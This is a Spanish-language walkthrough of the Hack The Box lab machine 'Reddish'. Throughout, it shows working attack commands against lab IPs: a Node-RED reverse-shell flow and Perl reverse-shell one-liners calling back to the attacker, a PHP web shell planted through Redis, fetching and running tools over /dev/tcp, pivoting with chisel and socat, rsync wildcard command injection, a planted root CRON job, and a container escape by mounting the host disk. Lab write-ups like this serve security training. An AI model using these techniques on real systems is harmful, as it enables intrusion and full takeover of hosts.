---
layout: post
title: Reddish
date: 2023-03-09
description:
img:
fig-caption:
tags: [eCPPTv2, eCPTXv2]
---
___

<center><img src="/writeups/assets/img/Reddish-htb/Reddish.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Abuso de Rode-Red

* Explotación de Redis-Cli

* Abuso de Rsync

* Abuso de tarea CRON

* Pivoting

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.94 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-09 06:59 GMT
Nmap scan report for 10.10.10.94
Host is up (0.044s latency).
Not shown: 63701 closed tcp ports (reset), 1833 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
1880/tcp open  vsat-control

Nmap done: 1 IP address (1 host up) scanned in 14.97 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p1880 10.10.10.94 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-09 07:00 GMT
Nmap scan report for 10.10.10.94
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.67 seconds
```

## Puerto 1080 (HTTP)

Con ```whatweb```, analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.94:1880
http://10.10.10.94:1880 [404 Not Found] Country[RESERVED][ZZ], HTML5, IP[10.10.10.94], Title[Error], UncommonHeaders[content-security-policy,x-content-type-options], X-Powered-By[Express]
```

La página principal no acepta el método GET

```null
curl -s -X GET http://10.10.10.94:1880/ | html2text
Cannot GET /
```

Al cambiarlo a POST, recibo una respuesta diferente en JSON

```null
curl -s -X POST http://10.10.10.94:1880/ | jq
{
  "id": "faf87b26ed1623d73bd6e533b8d9fefd",
  "ip": "::ffff:10.10.16.9",
  "path": "/red/{id}"
}
```

Introduzco el path junto al identificador en la URL. Se trata de un ```node-red```

<img src="/writeups/assets/img/Reddish-htb/1.png" alt="">

Existe una forma de enviar una reverse shell a través de este servicio

```null
[{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"10.10.16.9","port":"443","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]
```

Gano acceso a un contenedor

```null
nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.94] 36980
whoami
root
[object Object]
```

Para hacer un tratamiento de la TTY, me envío otra consola a través de perl

```null
perl -e 'use Socket;$i="10.10.16.9";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.94] 37430
/bin/sh: 0: can't access tty; job control turned off
# script /dev/null -c bash
root@nodered:/node-red# ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
root@nodered:/node-red# export TERM=xterm
root@nodered:/node-red# export SHELL=bash
root@nodered:/node-red# stty rows 55 columns 209
```

Tengo asignadas dos interfaces

```null
root@nodered:/node-red# hostname -I
172.18.0.2 172.19.0.4
```

Subo un binario estático de ```nmap``` para aplicar HostDiscovery. Como la máquina no tiene ```curl``` ni ```wget```, le añado una función que se encargue de simularlo

```null
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

```null
root@nodered:/tmp# __curl http:://10.10.16.9/nmap > nmap
```

```null
root@nodered:/tmp# ./nmap --min-rate 5000 172.18.0.1/24 172.19.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-09 07:32 UTC
Unable to find nmap-services!  Resorting to /etc/services
Unable to open /etc/services for reading service information
QUITTING!
root@nodered:/tmp# nano /etc/services
root@nodered:/tmp# ./nmap --min-rate 5000 172.18.0.1/24 172.19.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-09 07:33 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000029s latency).
All 1156 scanned ports on 172.18.0.1 are closed
MAC Address: 02:42:7F:DB:2C:79 (Unknown)

Nmap scan report for nodered (172.18.0.2)
Host is up (0.000015s latency).
All 1156 scanned ports on nodered (172.18.0.2) are closed

Nmap scan report for 172.19.0.1
Host is up (0.000011s latency).
All 1156 scanned ports on 172.19.0.1 are closed
MAC Address: 02:42:A1:B2:B8:EB (Unknown)

Nmap scan report for reddish_composition_redis_1.reddish_composition_internal-network (172.19.0.2)
Host is up (0.000012s latency).
Not shown: 1155 closed ports
PORT     STATE SERVICE
6379/tcp open  redis
MAC Address: 02:42:AC:13:00:02 (Unknown)

Nmap scan report for reddish_composition_www_1.reddish_composition_internal-network (172.19.0.3)
Host is up (0.000013s latency).
Not shown: 1155 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:13:00:03 (Unknown)

Nmap scan report for nodered (172.19.0.4)
Host is up (0.0000050s latency).
All 1156 scanned ports on nodered (172.19.0.4) are closed

Nmap done: 512 IP addresses (6 hosts up) scanned in 29.70 seconds
```

Para estas IP, escaneo todos los puertos

```null
root@nodered:/tmp# ./nmap -p- --open --min-rate 5000 -n -Pn 172.18.0.2 172.19.0.2 172.19.0.3 172.19.0.4

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-09 07:36 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.2
Host is up (0.000015s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
1880/tcp open  unknown

Nmap scan report for 172.19.0.2
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000022s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
6379/tcp open  redis
MAC Address: 02:42:AC:13:00:02 (Unknown)

Nmap scan report for 172.19.0.3
Host is up (0.000017s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:13:00:03 (Unknown)

Nmap scan report for 172.19.0.4
Host is up (0.000033s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
1880/tcp open  unknown

Nmap done: 4 IP addresses (4 hosts up) scanned in 66.12 seconds
```

Subo el ```chisel``` a la máquina para poder tener alcance con el resto de segmentos

```null
root@nodered:/tmp# __curl http://10.10.16.9/chisel > chisel
root@nodered:/tmp# chmod +x chisel
```

En mi equipo creo el servidor

```null
chisel server -p 1234 --reverse
```

Desde la máquina me conecto como cliente

```null
root@nodered:/tmp# ./chisel client 10.10.16.9:1234 R:socks &>/dev/null & disown
```

Veo el código fuente de la web de la 172.19.0.3

```null
proxychains curl -s -X GET http://172.19.0.3/
```

Aparecen rutas con parámetros

```null
proxychains curl -s -X GET http://172.19.0.3/ 2>/dev/null | grep url | sed 's/\s*//'
url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits",
url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits",
url: "8924d0549008565c554f8128cd11fda4/ajax.php?backup=...",
```

Y comentarios

```null
proxychains curl -s -X GET http://172.19.0.3/ 2>/dev/null | grep "*" | sed 's/\s*//'
/*
* TODO
*
* 1. Share the web folder with the database container (Done)
* 2. Add here the code to backup databases in /f187a0ec71ce99642e4f0afbd441a68b folder
* ...Still don't know how to complete it...
*/
```

El directorio existe, pero no tiene capacidad de directory listing

```null
proxychains curl -s -X GET http://172.19.0.3/f187a0ec71ce99642e4f0afbd441a68b/ -I
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
HTTP/1.1 403 Forbidden
Date: Thu, 09 Mar 2023 07:56:00 GMT
Server: Apache/2.4.10 (Debian)
Content-Length: 318
Content-Type: text/html; charset=iso-8859-1
```

El "test gits" devuelve un valor

```null
proxychains curl -s -X GET 'http://172.19.0.3/8924d0549008565c554f8128cd11fda4/ajax.php?test=get%20hits'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-1
```

Puedo incrementarlos mandando una petición a "incr gits". No está funcional, pero a través del error se puede ver una ruta

```null
proxychains curl -s -X GET 'http://172.19.0.3/8924d0549008565c554f8128cd11fda4/ajax.php?test=incr%20hits'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<br />
<b>Fatal error</b>:  Uncaught Exception: Cant read reply from socket. in /var/www/html/8924d0549008565c554f8128cd11fda4/lib/Client.php:83
Stack trace:
#0 /var/www/html/8924d0549008565c554f8128cd11fda4/lib/Client.php(105): Client-&gt;readBulkReply('2')
#1 /var/www/html/8924d0549008565c554f8128cd11fda4/ajax.php(9): Client-&gt;sendCmd('incr hits')
#2 {main}
  thrown in <b>/var/www/html/8924d0549008565c554f8128cd11fda4/lib/Client.php</b> on line <b>83</b><br />
```

En el navegador, cada vez que recargo se incrementa el número y lo puedo ver desde la consola de JavaScript

<img src="/writeups/assets/img/Reddish-htb/2.png" alt="">

Me puedo conectar al ```redis```

```null
proxychains redis-cli -h 172.19.0.2
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
172.19.0.2:6379>
```

Listo los clientes

```null
72.19.0.2:6379> client list
id=5 addr=172.19.0.4:60710 fd=8 name= age=184 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=0 qbuf-free=32768 obl=0 oll=0 omem=0 events=r cmd=client
(0.67s)
```

Hay una base de datos

```null
172.19.0.2:6379> info keyspace
# Keyspace
db0:keys=1,expires=0,avg_ttl=0
```

Me conecto a ella para extraer información

```null
172.19.0.2:6379> select 0
OK
172.19.0.2:6379> keys *
1) "hits"
```

Corresponde a lo que veía en la web

```null
172.19.0.2:6379> get hits
"6"
```

Creo un archivo ```cmd.php```. Es importante que haya tres saltos de línea al principio y al final

```null



<?php
  system($_REQUEST['cmd']);
?>



```

Lo sincronizo con el redis

```null
cat cmd.php | proxychains redis-cli -h 172.19.0.2 -x set cmd
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
OK
```

```null
proxychains redis-cli -h 172.19.0.2 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
OK
```

```null
proxychains redis-cli -h 172.19.0.2 config set dbfilename cmd.php
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
OK
```

```null
proxychains redis-cli -h 172.19.0.2 save
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
OK
```

Obtengo RCE

<img src="/writeups/assets/img/Reddish-htb/3.png" alt="">

Este segmento no tiene conectividad con mi equipo

<img src="/writeups/assets/img/Reddish-htb/4.png" alt="">

Subo el ```socat``` al otro contenedor para redirigir todo el tráfico que le llegue por un puerto a mi equipo por el 444. Utilizo ```perl``` para entablar la conexión

```null
root@nodered:/tmp# ./socat TCP-LISTEN:4444,fork TCP:10.10.16.9:444
```

Envío y recibo la reverse shell

```null
curl -s -X GET "http://172.19.0.3/8924d0549008565c554f8128cd11fda4/cmd.php?cmd=perl%20-e%20%27use%20Socket;$i=%22172.19.0.4%22;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,%22%3E%26S%22);open(STDOUT,%22%3E%26S%22);open(STDERR,%22%3E%26S%22);exec(%22/bin/sh%20-i%22);};%27"
```

```null
nc -nlvp 444
listening on [any] 444 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.94] 39568
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
sh: 0: getcwd() failed: No such file or directory
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
www-data@www:$ ^Z
zsh: suspended  nc -nlvp 444
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 444
                              reset xterm
www-data@www:$ export TERM=xterm
www-data@www:$ export SHELL=bash
www-data@www:$ stty rows 55 columns 209
```

```null
www-data@www:$ whoami
www-data
www-data@www:$ hostname -I
172.19.0.3 172.20.0.3 
```

Vuelvo a subir el nmap para escanear el otro segmento

```null
root@nodered:/tmp# ./socat TCP-LISTEN:1111,fork TCP:10.10.16.9:8000
```

```null
www-data@www:/tmp$ __curl http://172.19.0.4:1111/nmap > nmap
```

```null
www-data@www:/tmp$ ./nmap 172.20.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-09 08:59 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.20.0.1
Host is up (0.00039s latency).
All 1205 scanned ports on 172.20.0.1 are closed

Nmap scan report for reddish_composition_backup_1.reddish_composition_internal-network-2 (172.20.0.2)
Host is up (0.00043s latency).
Not shown: 1204 closed ports
PORT    STATE SERVICE
873/tcp open  rsync

Nmap scan report for www (172.20.0.3)
Host is up (0.00047s latency).
Not shown: 1204 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 256 IP addresses (3 hosts up) scanned in 16.57 seconds
```

Antes de continuar por ahí, busco formas de escalar privilegios en el contenedor. Subo el ```pspy```

```null
www-data@www:/tmp$ __curl http://172.19.0.4:1111/pspy > pspy
```

Encuentra procesos interesantes

```null
2023/03/09 09:06:01 CMD: UID=0    PID=705    | /bin/sh -c sh /backup/backup.sh 
2023/03/09 09:06:01 CMD: UID=0    PID=704    | /usr/sbin/CRON 
2023/03/09 09:06:01 CMD: UID=0    PID=708    | sh /backup/backup.sh 
2023/03/09 09:06:01 CMD: UID=0    PID=709    | sh /backup/backup.sh 
2023/03/09 09:06:01 CMD: UID=0    PID=710    | rsync -a rsync://backup:873/src/backup/ /var/www/html/ 
2023/03/09 09:06:01 CMD: UID=0    PID=711    | 
2023/03/09 09:06:01 CMD: UID=0    PID=712    | /usr/sbin/CRON 
2023/03/09 09:06:01 CMD: UID=109  PID=714    | /usr/sbin/sendmail -i -FCronDaemon -B8BITMIME -oem root 
2023/03/09 09:06:01 CMD: UID=109  PID=716    | /usr/sbin/exim4 -Mc 1paCDp-0000BU-Kp 
```

Se está creando un backup con ```rsync```. Tengo capacidad de lectura del script

```null
www-data@www:/$ cat /backup/backup.sh
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync -a *.rdb rsync://backup:873/src/rdb/
cd / && rm -rf /var/www/html/*
rsync -a rsync://backup:873/src/backup/ /var/www/html/
chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
```

Se pueden llegar a inyectar comandos en ```rsync```

<img src="/writeups/assets/img/Reddish-htb/5.png" alt="">

Creo un script en bash que se encargue de asignarle el SUID a la bash y lo almaceno en un archivo con extensión ```.rdb```

```null
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b$ echo -e '#!/bin/bash\nchmod u+s /bin/bash' > test.rdb
```

Renombro otro archivo al parámetro que quiero que interprete y le paso como argumento el ```test.rdb```

```null
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b$ touch -- '-e sh test.rdb'
```

Al tener la bash como SUID, la puedo spawnear como el propietario, que es ```root```

```null
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1029624 Nov  5  2016 /bin/bash
```

```null
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b$ bash -p
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
bash-4.3# whoami
root
```

Puedo ver la primera flag

```null
bash-4.3# cat user.txt 
3335fb3a68d07b41f25d8bfc436f7aee
```

# Escalada

Puedo enviar una traza ICMP para ver a que IP corresponde ```backup```

```null
bash-4.3# ping -c 1 backup
PING backup (172.20.0.2) 56(84) bytes of data.
64 bytes from reddish_composition_backup_1.reddish_composition_internal-network-2 (172.20.0.2): icmp_seq=1 ttl=64 time=0.037 ms

--- backup ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.037/0.037/0.037/0.000 ms
```

Dentro hay dos directorios

```null
bash-4.3# rsync rsync://172.20.0.2/
src            	src path
```

Se acontece un LFI

```null
bash-4.3# rsync rsync://172.20.0.2/src/etc/passwd passwd
bash-4.3# cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
```

En caso de tener capacidad de escritura, puedo agregar una tarea CRON al Sistema

```null
bash-4.3# rsync rsync://172.20.0.2/src/etc/cron.d/
drwxr-xr-x          4,096 2018/07/15 17:42:39 .
-rw-r--r--            102 2015/06/11 10:23:47 .placeholder
-rw-r--r--             29 2018/05/04 20:57:55 clean
```

```null
bash-4.3# echo '* * * * * root sh /tmp/pwned.sh' > pwned
```

Para poder recibir la reverse shell, necesito redirigir el flujo con ```socat```, pasando por los dos contenedores que ya están pwneados

```null
bash-4.3# __curl http://172.19.0.4:1111/socat > socat
bash-4.3# chmod +x socat 
bash-4.3# ./socat TCP-LISTEN:4444,fork TCP:172.19.0.4:1111 &>/dev/null & disown
```

Subo el script al ```/tmp``` de la máquina víctima

```null
bash-4.3# rsync pwned.sh rsync://172.20.0.2/src/tmp/pwned.sh
```

Y gano acceso al sistema

```null
nc -nlvp 446
listening on [any] 446 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.94] 50602
whoami
root
```

```null
script /dev/null -c bash
root@backup:~# ^Z
zsh: suspended  nc -nlvp 446
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 446
                              reset xterm
root@backup:~# export TERM=xterm
root@backup:~# export SHELL=bash
root@backup:~# stty rows 55 columns 209
```

Estoy dentro de un contenedor

```null
root@backup:~# hostname -I
172.20.0.2 
```

Tiene varios discos desplegados

```null
root@backup:/backup# ls -l /dev/sda*
brw-rw---- 1 root disk 8, 0 Mar  9 06:52 /dev/sda
brw-rw---- 1 root disk 8, 1 Mar  9 06:52 /dev/sda1
brw-rw---- 1 root disk 8, 2 Mar  9 06:52 /dev/sda2
brw-rw---- 1 root disk 8, 3 Mar  9 06:52 /dev/sda3
```

Creo una montura para ```/dev/sda2```

```null
root@backup:/mnt# mkdir sda2
root@backup:/mnt# cd !$
cd sda2
root@backup:/mnt/sda2# mount /dev/sda2 .
```

Tengo acceso a la máquina host

```null
root@backup:/mnt/sda2# ls
bin  boot  dev	etc  home  initrd.img  lib  lib64  lost+found  media  mnt  opt	proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz
```

Puedo ver la segunda flag

```null
root@backup:/mnt/sda2/root# cat root.txt 
ebaa9967691d5f9af1d85170f908785a
```